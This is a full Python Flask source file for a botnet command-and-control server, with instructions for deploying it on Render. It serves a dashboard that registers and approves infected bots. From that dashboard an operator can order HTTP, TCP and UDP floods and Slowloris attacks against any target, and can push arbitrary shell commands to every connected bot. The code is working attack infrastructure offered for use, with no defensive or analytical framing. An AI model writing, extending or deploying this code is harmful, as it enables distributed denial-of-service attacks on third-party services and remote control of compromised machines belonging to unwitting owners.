"""
BOTNET C2 SERVER - MATCHES CLIENT FEATURES
==========================================
Run: python server.py [port]
Example: python server.py 5000

Deploy on Render:
- requirements.txt: flask flask-cors
- Start command: python server.py $PORT
"""

import threading
import json
import time
import os
from datetime import datetime

try:
    from flask import Flask, render_template_string, request, jsonify
    from flask_cors import CORS
except ImportError:
    print("[!] Install dependencies: pip install flask flask-cors")
    exit(1)

app = Flask(__name__)
CORS(app)

# Global storage
approved_bots = {}  # bot_id: {specs, last_seen, status, approved_at}
pending_bots = {}   # bot_id: {specs, first_seen}
commands_queue = {}  # bot_id: [commands]
attack_logs = []

# HTML Dashboard
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Botnet C2 Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
        }
        .header {
            text-align: center;
            border: 2px solid #00ff00;
            padding: 20px;
            margin-bottom: 20px;
            background: #1a1a1a;
        }
        .header h1 { font-size: 2em; margin-bottom: 10px; color: #ff0000; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-box {
            border: 2px solid #00ff00;
            padding: 15px;
            background: #1a1a1a;
            text-align: center;
        }
        .stat-box h3 { color: #ff0000; margin-bottom: 5px; }
        .stat-box p { font-size: 2em; }
        .section {
            border: 2px solid #00ff00;
            padding: 20px;
            margin-bottom: 20px;
            background: #1a1a1a;
        }
        .section h2 {
            color: #ff0000;
            margin-bottom: 15px;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
        }
        .bot-list { display: grid; gap: 10px; }
        .bot-item {
            border: 1px solid #00ff00;
            padding: 10px;
            background: #0f0f0f;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .bot-item.offline { border-color: #666; color: #666; }
        .bot-item.pending { border-color: #ffff00; color: #ffff00; }
        .btn {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 8px 15px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
            margin-left: 10px;
        }
        .btn:hover { background: #00cc00; }
        .btn-danger { background: #ff0000; color: #fff; }
        .btn-danger:hover { background: #cc0000; }
        input, select, textarea, button {
            background: #0a0a0a;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 10px;
            font-family: inherit;
            width: 100%;
            margin: 5px 0;
        }
        button {
            cursor: pointer;
            font-weight: bold;
            background: #1a1a1a;
        }
        button:hover { background: #00ff00; color: #000; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; }
        textarea { min-height: 100px; font-size: 12px; }
        .log {
            max-height: 200px;
            overflow-y: auto;
            background: #0f0f0f;
            padding: 10px;
            border: 1px solid #00ff00;
        }
        .log-entry { margin-bottom: 5px; }
        .success { color: #00ff00; }
        .error { color: #ff0000; }
        .warning { color: #ffff00; }
        .pending-section {
            background: #1a1a0a;
            border-color: #ffff00;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>⚡ BOTNET C2 CONTROL PANEL ⚡</h1>
        <p>Manual Bot Approval System</p>
    </div>

    <div class="stats">
        <div class="stat-box">
            <h3>Approved Bots</h3>
            <p id="approved-bots">0</p>
        </div>
        <div class="stat-box">
            <h3>Pending Bots</h3>
            <p id="pending-bots">0</p>
        </div>
        <div class="stat-box">
            <h3>Online Bots</h3>
            <p id="online-bots">0</p>
        </div>
        <div class="stat-box">
            <h3>Active Attacks</h3>
            <p id="active-attacks">0</p>
        </div>
    </div>

    <div class="section pending-section">
        <h2>⏳ Pending Bots (Waiting for Approval)</h2>
        <div id="pending-list" class="bot-list"></div>
    </div>

    <div class="section">
        <h2>✓ Approved Bots</h2>
        <div id="approved-list" class="bot-list"></div>
    </div>

    <div class="section">
        <h2>💥 HTTP Flood Attack</h2>
        <div class="form-group">
            <label>Target URL:</label>
            <input type="text" id="http-target" placeholder="https://example.com">
        </div>
        <div class="form-group">
            <label>Threads per Bot:</label>
            <input type="number" id="http-threads" value="200">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="http-duration" value="60">
        </div>
        <div class="form-group">
            <label>Method:</label>
            <select id="http-method">
                <option value="GET">GET</option>
                <option value="POST">POST</option>
                <option value="HEAD">HEAD</option>
                <option value="PUT">PUT</option>
                <option value="DELETE">DELETE</option>
                <option value="OPTIONS">OPTIONS</option>
                <option value="PATCH">PATCH</option>
            </select>
        </div>
        <button onclick="launchHTTPFlood()">🚀 LAUNCH HTTP FLOOD</button>
    </div>

    <div class="section">
        <h2>⚡ TCP Flood Attack</h2>
        <div class="form-group">
            <label>Target (host:port):</label>
            <input type="text" id="tcp-target" placeholder="example.com:80">
        </div>
        <div class="form-group">
            <label>Threads per Bot:</label>
            <input type="number" id="tcp-threads" value="100">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="tcp-duration" value="60">
        </div>
        <button onclick="launchTCPFlood()">🔥 LAUNCH TCP FLOOD</button>
    </div>

    <div class="section">
        <h2>💣 UDP Flood Attack</h2>
        <div class="form-group">
            <label>Target (host:port):</label>
            <input type="text" id="udp-target" placeholder="example.com:53">
        </div>
        <div class="form-group">
            <label>Threads per Bot:</label>
            <input type="number" id="udp-threads" value="100">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="udp-duration" value="60">
        </div>
        <button onclick="launchUDPFlood()">💣 LAUNCH UDP FLOOD</button>
    </div>

    <div class="section">
        <h2>🐌 Slowloris Attack</h2>
        <div class="form-group">
            <label>Target URL:</label>
            <input type="text" id="slow-target" placeholder="https://example.com">
        </div>
        <div class="form-group">
            <label>Sockets per Bot:</label>
            <input type="number" id="slow-sockets" value="300">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="slow-duration" value="60">
        </div>
        <button onclick="launchSlowloris()">🐌 LAUNCH SLOWLORIS</button>
    </div>

    <div class="section">
        <h2>🛠️ Bot Commands</h2>
        <div class="form-group">
            <label>Shell Command (execute on all bots):</label>
            <input type="text" id="shell-command" placeholder="whoami">
        </div>
        <button onclick="sendShellCommand()">💻 EXECUTE COMMAND</button>
        <br><br>
        <button onclick="sendPing()">📡 PING ALL BOTS</button>
        <button onclick="sendSysInfo()">📊 GET SYSTEM INFO</button>
        <button onclick="stopAllAttacks()">🛑 STOP ALL ATTACKS</button>
    </div>

    <div class="section">
        <h2>📊 Attack Logs</h2>
        <div id="logs" class="log"></div>
    </div>

    <script>
        function approveBot(botId) {
            if(confirm('Approve bot: ' + botId + '?')) {
                fetch('/api/approve/' + botId, {method: 'POST'})
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    });
            }
        }

        function removeBot(botId) {
            if(confirm('Remove bot: ' + botId + '?')) {
                fetch('/api/remove/' + botId, {method: 'POST'})
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    });
            }
        }

        function updateStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('approved-bots').textContent = data.approved_bots;
                    document.getElementById('pending-bots').textContent = data.pending_bots;
                    document.getElementById('online-bots').textContent = data.online_bots;
                    document.getElementById('active-attacks').textContent = data.active_attacks;
                    
                    const pendingList = document.getElementById('pending-list');
                    pendingList.innerHTML = '';
                    if(data.pending.length === 0) {
                        pendingList.innerHTML = '<div style="text-align:center;color:#666;">No pending bots</div>';
                    }
                    data.pending.forEach(bot => {
                        const div = document.createElement('div');
                        div.className = 'bot-item pending';
                        div.innerHTML = `
                            <div>
                                <strong>[${bot.bot_id}]</strong> - 
                                ${bot.specs.cpu_cores} cores, ${bot.specs.ram_gb}GB RAM - 
                                ${bot.specs.os} - 
                                First seen: ${bot.first_seen}
                            </div>
                            <button class="btn" onclick="approveBot('${bot.bot_id}')">✓ APPROVE</button>
                        `;
                        pendingList.appendChild(div);
                    });
                    
                    const approvedList = document.getElementById('approved-list');
                    approvedList.innerHTML = '';
                    if(data.approved.length === 0) {
                        approvedList.innerHTML = '<div style="text-align:center;color:#666;">No approved bots</div>';
                    }
                    data.approved.forEach(bot => {
                        const div = document.createElement('div');
                        div.className = 'bot-item' + (bot.online ? '' : ' offline');
                        div.innerHTML = `
                            <div>
                                <strong>[${bot.bot_id}]</strong> - 
                                ${bot.specs.cpu_cores} cores, ${bot.specs.ram_gb}GB RAM - 
                                Status: ${bot.status || 'idle'} - 
                                Last seen: ${bot.last_seen}
                            </div>
                            <button class="btn btn-danger" onclick="removeBot('${bot.bot_id}')">✗ REMOVE</button>
                        `;
                        approvedList.appendChild(div);
                    });
                    
                    const logsDiv = document.getElementById('logs');
                    logsDiv.innerHTML = data.logs.slice(-20).reverse().map(log => 
                        `<div class="log-entry ${log.type}">[${log.time}] ${log.message}</div>`
                    ).join('');
                });
        }

        function launchHTTPFlood() {
            const target = document.getElementById('http-target').value;
            const duration = document.getElementById('http-duration').value;
            const threads = document.getElementById('http-threads').value;
            const method = document.getElementById('http-method').value;
            
            if (!target) {
                alert('Please enter target URL');
                return;
            }
            
            fetch('/api/attack/http', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ 
                    target, duration, threads, method
                })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            });
        }

        function launchTCPFlood() {
            const target = document.getElementById('tcp-target').value;
            const duration = document.getElementById('tcp-duration').value;
            const threads = document.getElementById('tcp-threads').value;
            
            if (!target) {
                alert('Please enter target');
                return;
            }
            
            fetch('/api/attack/tcp', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ target, duration, threads })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            });
        }

        function launchUDPFlood() {
            const target = document.getElementById('udp-target').value;
            const duration = document.getElementById('udp-duration').value;
            const threads = document.getElementById('udp-threads').value;
            
            if (!target) {
                alert('Please enter target');
                return;
            }
            
            fetch('/api/attack/udp', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ target, duration, threads })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            });
        }

        function launchSlowloris() {
            const target = document.getElementById('slow-target').value;
            const duration = document.getElementById('slow-duration').value;
            const sockets = document.getElementById('slow-sockets').value;
            
            if (!target) {
                alert('Please enter target URL');
                return;
            }
            
            fetch('/api/attack/slowloris', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ target, duration, sockets })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            });
        }

        function sendShellCommand() {
            const command = document.getElementById('shell-command').value;
            
            if (!command) {
                alert('Please enter a command');
                return;
            }
            
            fetch('/api/command/shell', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ command })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            });
        }

        function sendPing() {
            fetch('/api/command/ping', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                });
        }

        function sendSysInfo() {
            fetch('/api/command/sysinfo', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                });
        }

        function stopAllAttacks() {
            if(confirm('Stop all active attacks on all bots?')) {
                fetch('/api/command/stop', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    });
            }
        }

        setInterval(updateStats, 2000);
        updateStats();
    </script>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/check_approval', methods=['POST'])
def check_approval():
    data = request.json
    bot_id = data['bot_id']
    specs = data['specs']
    
    if bot_id not in approved_bots and bot_id not in pending_bots:
        pending_bots[bot_id] = {
            'specs': specs,
            'first_seen': time.time()
        }
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': 'warning',
            'message': f'New bot pending: {bot_id}'
        })
        print(f"[!] New bot pending: {bot_id}")
    
    if bot_id in approved_bots:
        approved_bots[bot_id]['last_seen'] = time.time()
        return jsonify({'approved': True})
    
    return jsonify({'approved': False})

@app.route('/commands/<bot_id>', methods=['GET'])
def get_commands(bot_id):
    if bot_id in approved_bots:
        approved_bots[bot_id]['last_seen'] = time.time()
    
    commands = commands_queue.get(bot_id, [])
    commands_queue[bot_id] = []
    
    return jsonify({'commands': commands})

@app.route('/status', methods=['POST'])
def receive_status():
    data = request.json
    bot_id = data['bot_id']
    
    if bot_id in approved_bots:
        approved_bots[bot_id]['status'] = data['status']
        approved_bots[bot_id]['last_seen'] = time.time()
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': data['status'],
        'message': f"{bot_id}: {data['message']}"
    })
    
    return jsonify({'status': 'ok'})

@app.route('/api/approve/<bot_id>', methods=['POST'])
def approve_bot(bot_id):
    if bot_id in pending_bots:
        approved_bots[bot_id] = {
            'specs': pending_bots[bot_id]['specs'],
            'last_seen': time.time(),
            'status': 'approved',
            'approved_at': time.time()
        }
        del pending_bots[bot_id]
        
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': 'success',
            'message': f'Bot approved: {bot_id}'
        })
        
        print(f"[+] Bot approved: {bot_id}")
        return jsonify({'status': 'success', 'message': f'Bot {bot_id} approved'})
    
    return jsonify({'status': 'error', 'message': 'Bot not found'}), 404

@app.route('/api/remove/<bot_id>', methods=['POST'])
def remove_bot(bot_id):
    if bot_id in approved_bots:
        del approved_bots[bot_id]
        if bot_id in commands_queue:
            del commands_queue[bot_id]
        
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': 'error',
            'message': f'Bot removed: {bot_id}'
        })
        
        print(f"[-] Bot removed: {bot_id}")
        return jsonify({'status': 'success', 'message': f'Bot {bot_id} removed'})
    
    return jsonify({'status': 'error', 'message': 'Bot not found'}), 404

@app.route('/api/stats', methods=['GET'])
def get_stats():
    current_time = time.time()
    online_bots = sum(1 for bot in approved_bots.values() if current_time - bot['last_seen'] < 30)
    active_attacks = sum(1 for bot in approved_bots.values() if bot.get('status') == 'running')
    
    pending_list = []
    for bot_id, info in pending_bots.items():
        pending_list.append({
            'bot_id': bot_id,
            'specs': info['specs'],
            'first_seen': time.strftime('%H:%M:%S', time.localtime(info['first_seen']))
        })
    
    approved_list = []
    for bot_id, info in approved_bots.items():
        approved_list.append({
            'bot_id': bot_id,
            'specs': info['specs'],
            'status': info.get('status', 'idle'),
            'last_seen': time.strftime('%H:%M:%S', time.localtime(info['last_seen'])),
            'online': current_time - info['last_seen'] < 30
        })
    
    return jsonify({
        'approved_bots': len(approved_bots),
        'pending_bots': len(pending_bots),
        'online_bots': online_bots,
        'active_attacks': active_attacks,
        'pending': pending_list,
        'approved': approved_list,
        'logs': attack_logs[-50:]
    })

@app.route('/api/attack/http', methods=['POST'])
def launch_http_attack():
    data = request.json
    
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {
                'type': 'http_flood',
                'target': data['target'],
                'duration': int(data['duration']),
                'threads': int(data['threads']),
                'method': data.get('method', 'GET')
            }
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'warning',
        'message': f'HTTP {data.get("method", "GET")} flood to {sent_count} bots → {data["target"]} ({data["threads"]} threads each)'
    })
    
    return jsonify({'status': 'success', 'message': f'HTTP flood sent to {sent_count} bots with {data["threads"]} threads each'})

@app.route('/api/attack/tcp', methods=['POST'])
def launch_tcp_attack():
    data = request.json
    
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {
                'type': 'tcp_flood',
                'target': data['target'],
                'duration': int(data['duration']),
                'threads': int(data['threads'])
            }
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'warning',
        'message': f'TCP flood to {sent_count} bots → {data["target"]} ({data["threads"]} threads each)'
    })
    
    return jsonify({'status': 'success', 'message': f'TCP flood sent to {sent_count} bots with {data["threads"]} threads each'})

@app.route('/api/attack/udp', methods=['POST'])
def launch_udp_attack():
    data = request.json
    
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {
                'type': 'udp_flood',
                'target': data['target'],
                'duration': int(data['duration']),
                'threads': int(data['threads'])
            }
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'warning',
        'message': f'UDP flood to {sent_count} bots → {data["target"]} ({data["threads"]} threads each)'
    })
    
    return jsonify({'status': 'success', 'message': f'UDP flood sent to {sent_count} bots with {data["threads"]} threads each'})

@app.route('/api/attack/slowloris', methods=['POST'])
def launch_slowloris_attack():
    data = request.json
    
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {
                'type': 'slowloris',
                'target': data['target'],
                'duration': int(data['duration']),
                'sockets': int(data['sockets'])
            }
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'warning',
        'message': f'Slowloris to {sent_count} bots → {data["target"]} ({data["sockets"]} sockets each)'
    })
    
    return jsonify({'status': 'success', 'message': f'Slowloris sent to {sent_count} bots with {data["sockets"]} sockets each'})

@app.route('/api/command/shell', methods=['POST'])
def send_shell_command():
    data = request.json
    
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {
                'type': 'shell',
                'command': data['command']
            }
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'warning',
        'message': f'Shell command to {sent_count} bots: {data["command"]}'
    })
    
    return jsonify({'status': 'success', 'message': f'Command sent to {sent_count} bots'})

@app.route('/api/command/ping', methods=['POST'])
def send_ping():
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {'type': 'ping'}
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'success',
        'message': f'Ping sent to {sent_count} bots'
    })
    
    return jsonify({'status': 'success', 'message': f'Ping sent to {sent_count} bots'})

@app.route('/api/command/sysinfo', methods=['POST'])
def send_sysinfo():
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {'type': 'sysinfo'}
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'success',
        'message': f'Sysinfo request sent to {sent_count} bots'
    })
    
    return jsonify({'status': 'success', 'message': f'Sysinfo sent to {sent_count} bots'})

@app.route('/api/command/stop', methods=['POST'])
def send_stop_all():
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {'type': 'stop_all'}
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'error',
        'message': f'Stop all attacks command sent to {sent_count} bots'
    })
    
    return jsonify({'status': 'success', 'message': f'Stop command sent to {sent_count} bots'})

if __name__ == '__main__':
    import sys
    
    print("\n╔════════════════════════════════════════════════════════╗")
    print("║           BOTNET C2 SERVER                             ║")
    print("╚════════════════════════════════════════════════════════╝")
    
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
    port = int(os.environ.get('PORT', port))
    
    print(f"[+] Starting server on port {port}")
    print(f"[+] Dashboard: http://localhost:{port}")
    print(f"[+] Waiting for bots...\n")
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
